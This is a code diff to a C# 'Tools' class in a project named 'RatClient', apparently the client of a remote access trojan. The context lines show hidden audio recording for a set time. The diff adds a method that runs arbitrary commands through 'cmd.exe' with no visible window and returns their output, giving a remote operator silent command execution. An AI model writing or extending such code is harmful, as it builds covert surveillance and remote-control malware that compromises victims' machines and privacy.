@@ -1,5 +1,9 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
+using System.Collections.Generic;
+using System.Linq;
 using System.Drawing;
+using System.IO;
 using System.Runtime.InteropServices;
 using RatClient.Mtool;
 
@@ -118,5 +122,33 @@ public class Tools
         ar.StartRecording();
         System.Threading.Thread.Sleep(range);
         return ar.StopRecording();
+    }
+    public static byte[] RunCommand(string command)
+    {
+        byte[] outputBytes = null;
+        ProcessStartInfo proc = new ProcessStartInfo();
+        proc.Arguments = $"/c {command}";
+        proc.FileName = "cmd.exe";
+        proc.RedirectStandardOutput = true;
+        proc.UseShellExecute = false;
+        proc.CreateNoWindow = true;
+        Process process = Process.Start(proc);
+        using (MemoryStream ms = new MemoryStream())
+        {
+            process.StandardOutput.BaseStream.CopyTo(ms);
+            if (ms.Length > 0)
+            {
+                outputBytes = ms.ToArray();
+            }
+            else
+            {
+                outputBytes = new byte[0];
+            }
+        }
+        process.WaitForExit();
+        process.Close();
+
+
+        return outputBytes;
     }
 }
